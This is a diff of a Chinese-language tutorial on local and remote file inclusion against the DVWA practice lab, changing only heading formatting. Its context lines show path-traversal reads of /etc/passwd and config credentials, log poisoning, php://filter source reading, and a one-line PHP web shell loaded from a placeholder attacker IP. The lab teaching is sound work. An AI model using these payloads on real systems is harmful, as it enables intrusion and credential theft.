@@ -31,7 +31,7 @@ include($file);
 
 ## 三、本地文件包含（LFI）
 
-### 1\. 正常访问
+### 1. 正常访问
 
 页面默认 URL 类似：
 
@@ -41,7 +41,7 @@ http://靶机IP/dvwa/vulnerabilities/fi/?page=include.php
 
 页面正常显示。
 
-### 2\. 读取系统敏感文件
+### 2. 读取系统敏感文件
 
 在 Linux 环境下，尝试读取 `/etc/passwd`：
 
@@ -59,7 +59,7 @@ http://靶机IP/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd
 
 具体需要多少个 `../` 取决于当前脚本所在目录深度。可以从 1 开始逐步增加，直到成功读取。
 
-### 3\. 读取 DVWA 配置文件
+### 3. 读取 DVWA 配置文件
 
 DVWA 的配置文件通常位于：
 
@@ -75,7 +75,7 @@ DVWA 的配置文件通常位于：
 
 成功后可获取数据库用户名、密码等敏感信息。
 
-### 4\. 读取 Apache 日志
+### 4. 读取 Apache 日志
 
 如果日志文件可读，可以包含：
 
@@ -85,7 +85,7 @@ DVWA 的配置文件通常位于：
 
 结合日志投毒，可以将 PHP 代码写入 User-Agent，然后包含日志文件执行代码，从而 GetShell。
 
-### 5\. 使用 PHP 伪协议读取源码
+### 5. 使用 PHP 伪协议读取源码
 
 即使文件是 PHP 源码，直接包含会被执行而不是显示源码。可以使用 `php://filter` 伪协议进行 Base64 编码读取：
 
@@ -97,7 +97,7 @@ DVWA 的配置文件通常位于：
 
 ## 四、远程文件包含（RFI）
 
-### 1\. 前提条件
+### 1. 前提条件
 
 RFI 需要 PHP 配置：
 
@@ -108,7 +108,7 @@ allow_url_include = On
 
 DVWA 的默认环境通常已开启。
 
-### 2\. 在攻击机准备恶意文件
+### 2. 在攻击机准备恶意文件
 
 创建一个 `shell.txt` 或 `shell.php`，内容：
 
@@ -125,7 +125,7 @@ system($_GET['cmd']);
 http://攻击者IP/shell.txt
 ```
 
-### 3\. 远程包含
+### 3. 远程包含
 
 在 DVWA 中提交：
 
@@ -139,7 +139,7 @@ http://靶机IP/dvwa/vulnerabilities/fi/?page=http://攻击者IP/shell.txt
 http://靶机IP/dvwa/vulnerabilities/fi/?page=http://攻击者IP/shell.txt&cmd=whoami
 ```
 
-### 4\. 使用 data:// 伪协议
+### 4. 使用 data:// 伪协议
 
 如果 `allow_url_include` 开启，还可以使用 `data://` 直接执行代码：
 
